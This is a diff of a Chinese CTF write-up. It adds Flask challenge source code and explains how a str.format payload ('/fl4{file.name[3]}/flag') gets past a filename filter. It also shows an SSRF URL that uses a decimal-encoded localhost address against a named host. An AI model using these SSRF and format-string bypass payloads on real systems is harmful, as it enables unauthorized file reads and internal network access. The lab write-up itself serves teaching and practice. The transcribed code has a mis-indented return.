@@ -184,8 +184,6 @@ var_dump(scandir('/'));
 
 ![](/assets/import18.png)
 
-
-
 ### 0x03 rcmd
 
 先进行代码审计
@@ -202,7 +200,7 @@ var_dump(scandir('/'));
 
 扫描端口发现开放端口并在5000端口检测到回显有一段文字提示
 
-最终payload: 
+最终payload:
 
 ```
 http://api.yoshino-s.online:11455/?url=http://2130706433:5000&start=%1$s
@@ -221,6 +219,31 @@ http://api.yoshino-s.online:11455/?url=http://2130706433:5000&start=%1$s
 main.py:
 
 ```
+from flask import Flask, request
+from file import File
+from readfile import FileReader
+
+app = Flask(__name__)
+
+@app.route('/query')
+def query():
+    path = request.args.get('path')
+    if not path:
+        return '请输入路径'
+    file = FileReader(File(path))
+    return str(file)
+
+@app.route('/')
+def index():
+    return 'Use /query?path= to query what you want. And what you want is at /fl4g/flag'
+
+if __name__ == '__main__':
+    app.run(port=8890)
+```
+
+File.py:
+
+```
 import os
 import os.path
 
@@ -234,9 +257,45 @@ class File:
             return os.listdir(os.path.dirname(self.dir))
 ```
 
+Readfile.py
 
+```
+from file import File
 
+class FileReader:
+    def __init__(self, file):
+        self.file = file
+    def __str__(self):
+        if 'fl4g' in self.file.path:
+            return 'nonono,it is a secret!!!'
+        else:
+            output = 'The file you read is:\n'
+            filepath = (self.file.dir + '/{file.name}').format(file=self.file)
+            output += filepath
+            output += '\n\nThe content is:\n'
+            try:
+                f = open(filepath,'r')
+                content = f.read()
+                f.close()
+            except:
+                content = 'can\'t read'
+            output += content
+            output += '\n\nOther files under the same folder:\n'
+            output += '\n'.join(self.file.listDir())
+    return output.replace('\n','')
+```
 
+代码审计得到，这三个脚本读取文件并过滤文件名`fl4g`。解决方法为利用format格式化绕过`fl4g`的名称检测
+
+Payload：
+
+```
+/fl4{file.name[3]}/flag
+```
+
+获得flag
+
+![](/assets/import23.png)
 
 
 
